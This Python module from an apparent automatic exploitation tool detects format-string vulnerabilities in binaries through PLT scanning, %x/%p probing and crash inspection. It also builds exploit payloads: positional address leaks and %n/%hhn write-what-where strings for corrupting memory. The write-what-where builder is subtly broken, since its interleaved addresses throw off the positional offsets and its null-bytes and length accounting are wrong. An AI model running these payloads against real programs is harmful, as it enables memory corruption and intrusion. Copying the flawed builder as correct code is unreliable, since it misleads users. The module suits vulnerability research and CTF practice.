"""
Format string vulnerability detection.
"""

import re
import subprocess
import tempfile
from typing import Any, Dict, List, Optional, Tuple

from autopwn.core.binary import Binary
from autopwn.fuzzing.crash_triage import CrashCase
from autopwn.vulns.detector import (
    ExploitPrimitive,
    Vulnerability,
    VulnerabilityDetector,
    VulnSeverity,
    VulnType,
)
from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


class FormatStringDetector(VulnerabilityDetector):
    """
    Detect format string vulnerabilities.

    Detection methods:
    1. Static: Find printf-family calls with non-constant format
    2. Dynamic: Test with format specifiers
    3. Crash analysis: Detect format string crashes
    """

    name = "format_string_detector"
    vuln_type = VulnType.FORMAT_STRING

    # Printf-family functions
    PRINTF_FUNCS = [
        "printf", "fprintf", "sprintf", "snprintf",
        "vprintf", "vfprintf", "vsprintf", "vsnprintf",
        "dprintf", "syslog",
    ]

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[Vulnerability]:
        """
        Detect format string vulnerabilities.

        Args:
            crash: Optional crash case

        Returns:
            List of vulnerabilities
        """
        vulnerabilities = []

        # Static detection
        static_vulns = self._detect_static()
        vulnerabilities.extend(static_vulns)

        # Dynamic detection
        dynamic_vuln = self._detect_dynamic()
        if dynamic_vuln:
            vulnerabilities.append(dynamic_vuln)

        # Crash analysis
        if crash:
            crash_vuln = self._detect_from_crash(crash)
            if crash_vuln:
                vulnerabilities.append(crash_vuln)

        self._vulnerabilities = vulnerabilities
        return vulnerabilities

    def _detect_static(self) -> List[Vulnerability]:
        """
        Static format string detection.

        Returns:
            Potential vulnerabilities
        """
        vulns = []

        for func_name in self.PRINTF_FUNCS:
            if func_name in self.binary.plt:
                vuln = Vulnerability(
                    vuln_type=VulnType.FORMAT_STRING,
                    severity=VulnSeverity.MEDIUM,
                    address=self.binary.plt[func_name],
                    function=func_name,
                    detection_method="static",
                    confidence=0.4,
                    description=f"Call to {func_name} - potential format string vulnerability",
                )
                vulns.append(vuln)

        return vulns

    def _detect_dynamic(
        self,
        test_patterns: Optional[List[bytes]] = None,
    ) -> Optional[Vulnerability]:
        """
        Dynamic format string detection.

        Args:
            test_patterns: Custom test patterns

        Returns:
            Vulnerability if detected
        """
        if test_patterns is None:
            test_patterns = [
                b"%x" * 20 + b"\n",
                b"%p" * 20 + b"\n",
                b"AAAA%08x.%08x.%08x.%08x\n",
                b"%s%s%s%s%s\n",
            ]

        for pattern in test_patterns:
            try:
                result = subprocess.run(
                    [str(self.binary.path)],
                    input=pattern,
                    capture_output=True,
                    timeout=5,
                )

                output = result.stdout + result.stderr

                # Check for leaked addresses
                if self._check_format_leak(output):
                    vuln = Vulnerability(
                        vuln_type=VulnType.FORMAT_STRING,
                        severity=VulnSeverity.HIGH,
                        detection_method="dynamic",
                        confidence=0.9,
                        controllable_input=pattern,
                        description="Format string vulnerability - can leak memory",
                    )

                    # Determine offset
                    offset = self._find_format_offset()
                    if offset:
                        vuln.offset = offset
                        vuln.details["format_offset"] = offset

                    return vuln

            except Exception as e:
                logger.debug(f"Dynamic test failed: {e}")

        return None

    def _check_format_leak(self, output: bytes) -> bool:
        """
        Check if output contains format string leaks.

        Args:
            output: Program output

        Returns:
            True if leaks detected
        """
        try:
            output_str = output.decode('latin-1')

            # Look for hex addresses
            hex_pattern = r"(0x)?[0-9a-f]{8,16}"
            matches = re.findall(hex_pattern, output_str, re.IGNORECASE)

            # Multiple hex values suggest format string leak
            if len(matches) > 5:
                return True

            # Look for repeated patterns from %p
            if "0x" in output_str.lower() and output_str.count("0x") > 3:
                return True

        except Exception:
            pass

        return False

    def _find_format_offset(
        self,
        max_offset: int = 50,
    ) -> Optional[int]:
        """
        Find format string argument offset.

        Args:
            max_offset: Maximum offset to try

        Returns:
            Offset or None
        """
        marker = b"AAAA"

        for offset in range(1, max_offset):
            payload = marker + f"%{offset}$x".encode() + b"\n"

            try:
                result = subprocess.run(
                    [str(self.binary.path)],
                    input=payload,
                    capture_output=True,
                    timeout=5,
                )

                output = result.stdout.decode('latin-1', errors='ignore')

                # Check if marker appears as hex
                if "41414141" in output:
                    logger.debug(f"Found format offset: {offset}")
                    return offset

            except Exception:
                continue

        return None

    def _detect_from_crash(
        self,
        crash: CrashCase,
    ) -> Optional[Vulnerability]:
        """
        Detect format string from crash.

        Args:
            crash: Crash case

        Returns:
            Vulnerability or None
        """
        # Check for format string indicators in crash
        if not crash.input_data:
            return None

        # Look for format specifiers in input
        input_str = crash.input_data.decode('latin-1', errors='ignore')

        format_patterns = ["%s", "%n", "%x", "%p", "%d", "%08x"]
        has_format = any(p in input_str for p in format_patterns)

        if not has_format:
            return None

        # %n crash is highly indicative
        if "%n" in input_str:
            severity = VulnSeverity.CRITICAL
            description = "Format string write detected (%n)"
        elif "%s" in input_str:
            severity = VulnSeverity.HIGH
            description = "Format string crash with %s"
        else:
            severity = VulnSeverity.MEDIUM
            description = "Possible format string vulnerability"

        vuln = Vulnerability(
            vuln_type=VulnType.FORMAT_STRING,
            severity=severity,
            address=crash.crash_address,
            detection_method="crash",
            confidence=0.85,
            controllable_input=crash.input_data,
            crash=crash,
            description=description,
        )

        # Add primitives
        if "%n" in input_str:
            vuln.primitives.append(ExploitPrimitive(
                primitive_type="write",
                target_controllable=True,
                value_controllable=True,
            ))

        vuln.primitives.append(ExploitPrimitive(
            primitive_type="leak",
            target_controllable=True,
        ))

        return vuln

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """Get exploitation primitive."""
        if vuln.primitives:
            # Prefer write primitive over leak
            for p in vuln.primitives:
                if p.primitive_type == "write":
                    return p
            return vuln.primitives[0]

        return ExploitPrimitive(
            primitive_type="leak",
            target_controllable=True,
        )

    def build_leak_payload(
        self,
        offset: int,
        num_leaks: int = 10,
    ) -> bytes:
        """
        Build payload to leak addresses.

        Args:
            offset: Format string offset
            num_leaks: Number of addresses to leak

        Returns:
            Payload bytes
        """
        payload = b""
        for i in range(num_leaks):
            payload += f"%{offset + i}$p.".encode()
        return payload + b"\n"

    def build_write_payload(
        self,
        offset: int,
        target_addr: int,
        value: int,
        bits: int = 64,
    ) -> bytes:
        """
        Build payload to write value to address.

        Args:
            offset: Format string offset
            target_addr: Address to write to
            value: Value to write
            bits: 32 or 64 bit

        Returns:
            Payload bytes
        """
        # This is a simplified payload builder
        # Real implementation needs to handle:
        # - Multi-write for full value
        # - Byte ordering
        # - Current output length tracking

        if bits == 64:
            addr_bytes = target_addr.to_bytes(8, 'little')
        else:
            addr_bytes = target_addr.to_bytes(4, 'little')

        # Build payload for single byte write
        payload = addr_bytes
        write_val = value & 0xFF
        payload += f"%{write_val}c%{offset}$n".encode()

        return payload

    def build_write_what_where(
        self,
        offset: int,
        target_addr: int,
        value: int,
    ) -> bytes:
        """
        Build write-what-where payload using %n.

        Args:
            offset: Format string offset
            target_addr: Where to write
            value: What to write

        Returns:
            Payload bytes
        """
        # For a full write, we need to write byte by byte
        # This handles the "what" value byte by byte

        payload = b""
        current_len = 0

        for i in range(8 if self.binary.bits == 64 else 4):
            byte_addr = target_addr + i
            byte_val = (value >> (i * 8)) & 0xFF

            # Add address to payload
            addr_bytes = byte_addr.to_bytes(
                8 if self.binary.bits == 64 else 4,
                'little'
            )

            # Calculate padding needed
            if byte_val > current_len:
                padding = byte_val - current_len
            else:
                padding = (256 + byte_val - current_len) % 256

            payload += addr_bytes
            current_len += len(addr_bytes)

            if padding > 0:
                payload += f"%{padding}c".encode()
                current_len += padding

            payload += f"%{offset + i}$hhn".encode()

        return payload + b"\n"

    def summary(self) -> str:
        """Get detection summary."""
        printf_funcs = [f for f in self.PRINTF_FUNCS if f in self.binary.plt]

        return f"""
Format String Detection
=======================
Binary: {self.binary.path.name}

Printf functions: {printf_funcs}
Vulnerabilities: {len(self._vulnerabilities)}
"""
